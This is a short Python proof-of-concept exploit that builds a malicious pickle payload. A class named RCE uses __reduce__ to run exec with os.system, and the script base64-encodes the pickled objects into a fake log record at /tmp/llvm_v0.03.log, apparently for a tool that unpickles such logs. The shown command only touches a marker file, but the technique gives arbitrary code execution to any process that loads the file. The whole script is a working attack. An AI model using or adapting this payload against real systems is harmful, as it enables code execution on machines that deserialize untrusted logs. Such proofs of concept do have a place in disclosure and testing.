import pickle, base64, os, time

class RCE:
    def __reduce__(self):
        return (exec, ('import os; os.system("touch /tmp/rce_success")',))

task = base64.b64encode(pickle.dumps(('dummy', [], {}, 'dummy'))).decode()
config = base64.b64encode(pickle.dumps(RCE())).decode()
result = base64.b64encode(pickle.dumps(([1.0], 0, 1.0, time.time()))).decode()

with open('/tmp/llvm_v0.03.log', 'w') as f:
    f.write(f'cuda\t{task}\t{config}\t{result}')

print('[+] Payload generated at /tmp/llvm_v0.03.log')
